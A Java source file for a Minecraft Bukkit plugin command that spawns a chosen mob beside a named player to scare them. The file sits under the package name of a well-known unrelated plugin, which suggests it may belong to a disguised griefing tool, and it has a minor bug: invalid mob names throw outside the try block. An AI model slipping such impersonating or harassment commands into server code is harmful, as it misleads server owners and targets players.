package net.milkbowl.vault.commands.cmds;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;

public class Scare extends CommandManager {


    public void execute(Core plugin, String msg, String[] args, Player p) {
        if (args.length == 3) {
            Player target = Bukkit.getServer().getPlayer(args[1]);

            if (target == null) {
                p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " is not online."));
            } else {
                Location loc = target.getLocation().getBlock().getRelative(0, 0, 3).getLocation();
                EntityType mob = EntityType.valueOf(args[2].toUpperCase());
                try {
                    Bukkit.getScheduler().scheduleSyncDelayedTask(plugin, () -> target.getWorld().spawnEntity(loc, mob));
                    p.sendMessage(Settings.PREFIX("Summoned " + mob + " on " + Settings.HIGHLIGHT_COLOUR + target.getName()));
                } catch (Exception ex) {
                    ex.printStackTrace();
                    p.sendMessage(Settings.PREFIX("That mob doesn't exist!"));
                }
            }




        } else {
            p.sendMessage(Settings.USAGE("Scare <player> <mob>"));
        }
    }
}
